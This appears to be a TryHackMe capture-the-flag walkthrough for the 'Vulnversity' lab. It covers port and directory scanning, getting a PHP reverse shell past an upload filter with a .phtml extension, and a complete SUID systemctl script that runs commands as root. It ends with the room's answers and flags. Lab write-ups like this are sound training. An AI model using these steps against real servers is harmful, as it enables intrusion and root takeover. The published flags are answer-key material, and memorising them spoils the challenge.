# Vulnversity

Welcome to the Vulnversity room walkthrough on TryHackMe!

{% embed url="https://tryhackme.com/room/vulnversity" %}

***

Vulnversity is an active boot-to-root Linux challenge covering active reconnaissance with Nmap, directory busting using Gobuster, unrestricted file upload bypass via alternative extensions, gaining a reverse shell, and escalating privileges to root by exploiting a misconfigured SUID binary (`systemctl`).

---

## 1. Reconnaissance with Nmap

We begin by scanning the target machine:

```bash
nmap -sV -sC -p- -T4 -oN nmap_vulnversity.txt <TARGET_IP>
```

### Scan Results:
```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

Key observations:
- **Number of open ports**: `6`
- **Squid Proxy Version**: `3.5.12`
- **Web server port**: `3333` (Apache 2.4.18 running on Ubuntu)

---

## 2. Web Enumeration with Gobuster

Browsing to `http://<TARGET_IP>:3333/` displays a university website. Let's find hidden directories using `gobuster`:

```bash
gobuster dir -u http://<TARGET_IP>:3333/ -w /usr/share/wordlists/dirb/common.txt
```

### Output:
```text
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/internal (Status: 301)
```

The `/internal/` endpoint (`http://<TARGET_IP>:3333/internal/`) hosts an upload form page.

---

## 3. Bypassing File Upload Restrictions

When we attempt to upload a standard PHP reverse shell (`shell.php`), the server rejects it:
```text
Extension not allowed
```

We test alternative PHP executable extensions: `.php3`, `.php4`, `.php5`, `.phtml`.

Using Burp Suite Intruder to fuzz the extension:
1. Intercept the file upload request in Burp Suite.
2. Send to Intruder and set a payload marker on the extension: `shell.§php§`.
3. Load the extension list:
   - `php`
   - `php3`
   - `php4`
   - `php5`
   - `phtml`
4. Run the attack. Only **`.phtml`** returns a successful upload response: `Success`.

---

## 4. Initial Foothold & User Flag

1. Rename our reverse shell to `shell.phtml` and configure our listener IP and port `4444`.
2. Upload `shell.phtml` at `http://<TARGET_IP>:3333/internal/`.
3. Start a Netcat listener on our machine:
   ```bash
   nc -lvnp 4444
   ```
4. Trigger the shell by accessing the uploaded file:
   ```text
   http://<TARGET_IP>:3333/internal/uploads/shell.phtml
   ```
5. We get a reverse shell as user `www-data`!

### Enumerate Users:
```bash
$ whoami
www-data
$ ls -la /home
drwxr-xr-x 3 bill bill 4096 Jul 31  2019 bill
```
The user managing the webserver is **`bill`**.

### Read the User Flag:
```bash
cat /home/bill/user.txt
```
```text
8bd7992fbe8a6ad22a63361004cfcedb
```

**User Flag:** `8bd7992fbe8a6ad22a63361004cfcedb`

---

## 5. Privilege Escalation via SUID `systemctl`

We search for binaries with the SUID bit set:

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Notable SUID Binaries:
```text
/bin/systemctl
```

`/bin/systemctl` has SUID permissions enabled. According to **GTFOBins**, we can abuse `systemctl` by creating a custom systemd service that executes commands as root.

### Exploitation Script:
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_flag.txt && chmod 777 /tmp/root_flag.txt"
[Install]
WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Now we read the generated output file:

```bash
cat /tmp/root_flag.txt
```
```text
a58ff8579f0a9270368d33a9966c7fd5
```

**Root Flag:** `a58ff8579f0a9270368d33a9966c7fd5`

---

## 🏁 Questions & Answers

| Task / Question | Answer |
| :--- | :--- |
| **Scan the box; how many ports are open?** | `6` |
| **What version of the squid proxy is running on the machine?** | `3.5.12` |
| **How many ports will nmap scan if the flag -p-400 was used?** | `400` |
| **What is the most likely operating system this machine is running?** | `Ubuntu` |
| **What port is the web server running on?** | `3333` |
| **What is the flag for using the nmap default scripts?** | `-sC` |
| **What is the directory which has an upload form page?** | `/internal/` |
| **What common extension seems to be blocked?** | `.php` |
| **Run this attack, what extension is allowed?** | `.phtml` |
| **What is the name of the user who manages the webserver?** | `bill` |
| **What is the user flag?** | `8bd7992fbe8a6ad22a63361004cfcedb` |
| **On the system, search for all SUID files. Which file stands out?** | `/bin/systemctl` |
| **Become root and get the root flag:** | `a58ff8579f0a9270368d33a9966c7fd5` |

***
